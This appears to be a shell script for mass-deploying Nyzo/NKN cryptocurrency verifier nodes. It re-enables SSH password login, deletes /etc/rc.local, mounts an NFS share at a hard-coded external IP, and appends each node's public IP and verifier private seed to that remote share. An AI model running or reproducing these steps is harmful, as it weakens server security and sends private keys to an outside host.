cd /etc/ssh &&
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' sshd_config &&
service sshd restart &&
sleep 5s &&
cd /root/nknx &&
bash install.sh &&
sleep 5s &&
bash nyzo.sh &&
bash -c 'echo "wdcdojiuer-$RANDOM-do" > /var/lib/nyzo/production/nickname' &&
supervisorctl reload &&
cd /root/nknx &&
cd /etc &&
rm rc.local &&
#cd /root &&
#cp /root/nknx/reboot.sh /etc/rc.local &&
#chmod 777 /etc/rc.local &&
cd /root &&
rm -rf nknx &&

sleep 5s &&
apt-get install nfs-common -y &&
sleep 5s && 
sudo mount -t nfs 64.227.99.95:/nfsnyzo /nyzo -o nolock &&
sleep 20s &&
curl http://members.3322.org/dyndns/getip >> /root/temp &&
sleep 10s &&
#sleep $[RANDOM%20]s &&

echo "`cat /root/temp`:9444:`cat /var/lib/nyzo/production/verifier_private_seed`" >> /nyzo/nyzodojiuer &&

sleep 15s &&

echo "`cat /root/temp`," >> /nyzo/nkndojiuer &&

sleep 15s &&

#echo "`cat /root/temp`:9444:`cat /var/lib/nyzo/production/verifier_private_seed`" >> /root/seed &&

#sleep 5s &&

#echo "`cat /root/temp`," >> /root/nkndo &&

reboot
